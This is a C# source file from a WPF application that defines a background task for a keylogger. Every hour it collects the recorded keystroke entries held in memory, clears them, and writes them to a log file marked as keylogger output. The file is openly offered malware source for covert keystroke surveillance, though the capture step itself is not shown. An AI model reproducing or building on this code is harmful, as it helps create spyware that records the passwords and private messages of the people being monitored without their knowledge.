using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using WPF.Databases.Contexts;
using WPF.Models.Interfaces;

namespace WPF.Managers.Tasks
{
    class KeyLoggerCollecterTask : IBackgroundTask, IDisposable
    {
        public BackgroundWorker BackgroundWorker { get; } = new BackgroundWorker();

        public void Dispose()
        {
            BackgroundWorker.DoWork -= BackgroundWorker_DoWork;
            GC.Collect();
        }

        public void Run()
        {
            BackgroundWorker.DoWork += BackgroundWorker_DoWork;
            BackgroundWorker.RunWorkerAsync();
        }

        private void BackgroundWorker_DoWork(object sender, DoWorkEventArgs e)
        {
            while(true)
            {
                Thread.Sleep(3600000); // Sleep one hour
                if(MainContext.Instance.KeyLogger.Any())
                {
                    var stringbuilder = new StringBuilder();
                    foreach (var log in MainContext.Instance.KeyLogger)
                    {
                        stringbuilder.Append(log);
                        stringbuilder.Append(Environment.NewLine);
                    }
                    MainContext.Instance.KeyLogger.Clear();

                    LogManager.Instance.LogToFile(new Models.LogInfoModel
                    {
                        Type = Models.Enums.FileTypesEnum.KEYLOGGER,
                        Message = stringbuilder.ToString()
                    });
                }
            }
        }
    }
}
